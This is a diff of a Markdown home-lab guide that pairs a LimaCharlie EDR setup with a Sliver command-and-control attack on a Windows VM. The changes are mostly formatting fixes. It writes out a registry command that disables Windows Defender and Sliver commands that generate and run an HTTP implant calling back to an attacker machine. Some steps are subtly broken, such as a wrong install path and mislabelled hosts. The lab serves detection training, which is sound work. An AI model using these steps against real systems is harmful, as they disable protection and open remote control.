@@ -25,7 +25,9 @@ Step 3 – Disable via Registry
 
 `REG ADD "hklm\software\policies\Microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f` 
 .
-	     ![Resource Group Screenshot](Document_Images/images3.png)
+
+
+   ![Resource Group Screenshot](Document_Images/images3.png)
 
  
 Step 4 – Boot into Safe Mode
@@ -87,7 +89,7 @@ Step 1 – Create Organization in LimaCharlie.io
 
 Step 2 – Download and Install Agent
 
-1. Select the x86-64 .exe sensor and hold on first.
+1. Select the `x86-64.(exe)` sensor and hold on first.
 
  	 ![Resource Group Screenshot](Document_Images/images13.png)
    
@@ -125,6 +127,7 @@ Step 3 – Enable Sysmon Log Collection
 
     ![Resource Group Screenshot](Document_Images/images19.png)
 
+---
 
 ## 4. Set Up Attack System (Sliver C2)
 
@@ -141,6 +144,7 @@ In this example:
 Tip: Write down your interface name and IP address; you’ll need them multiple times.
 
    ![Resource Group Screenshot](Document_Images/images20.png)
+
 
 3. Check the VM’s gateway:
 
@@ -162,15 +166,15 @@ Example:
 
 yaml
 
-`network:
-   ethernets:
+    network:
+    ethernets:
      ens33:
        dhcp4: no
        addresses: [192.168.137.132/24]
-       gateway4: 192.168.2.2
-       nameservers:
+	   gateway4: 192.168.2.2
+	   nameservers:
 	 addresses: [8.8.8.8,8.8.4.4]
- version: 2`
+    version: 2 
 
    ![Resource Group Screenshot](Document_Images/images22.png)
 
@@ -201,45 +205,44 @@ bash
 
 Step 3 – Install Sliver
 
-bash
+bash:
 
-# Download Sliver Linux server binary
-
+Download Sliver Linux server binary
 `wget https://github.com/BishopFox/sliver/releases/download/v1.5.32/sliver-server_linux -O /user/local/bin/sliver-server`
 
-# Make it executable
-
+Make it executable
 `chmod +x /usr/local/bin/sliver-server`
 
-# Install mingw-w64 for additional capabilities
-
+Install mingw-w64 for additional capabilities
 `apt install -y mingw-w64`
 
-# Create and enter our working directory
-
+Create and enter our working directory
 `mkdir -p /opt/sliver`
+
+---
 
 ## 5. Start Command & Control Session
 
+On Windows 
+
 Step 1 – Launch Sliver Server
-bash
+
+
 
 `sliver-server`
 
    ![Resource Group Screenshot](Document_Images/images25.png)
 
 Step 2 – Generate Payload
-bash
 
 `generate --http [Linux_VM_IP] --save /opt/sliver`
 
    ![Resource Group Screenshot](Document_Images/images26.png)
 
-Take note the output file will randomized name.
+**Take note the output file will randomized name.**
+
 
 Check implant list:
-
-bash
 
 `implants`
 
@@ -252,7 +255,8 @@ bash
 `exit`
 
 Step 3 – Transfer Payload to Windows VM
-On Linux:
+
+On Windows:
 
 bash
 
@@ -268,6 +272,7 @@ powershell
 
    ![Resource Group Screenshot](Document_Images/images28.png)
 
+---
 
 ## 5. Start Command and Control Session
 
@@ -277,11 +282,11 @@ On Windows:
 
 2. Start Sliver:
 
-`sliver-server`
+	`sliver-server`
 
-`http`
+	`http`
 
-   ![Resource Group Screenshot](Document_Images/images29.png)
+    ![Resource Group Screenshot](Document_Images/images29.png)
    
 
 3. Return Windows VM and execute C2 payload from download location using administrative PowerShell prompt we had from before
@@ -327,6 +332,8 @@ Examine network connections occurring on the remote system
 netstat
 
    ![Resource Group Screenshot](Document_Images/images34.png)
+
+---
 
 ## 6.Observe EDR Telemetry in LimaCharlie
 Step 1 – Identify the Malicious Process
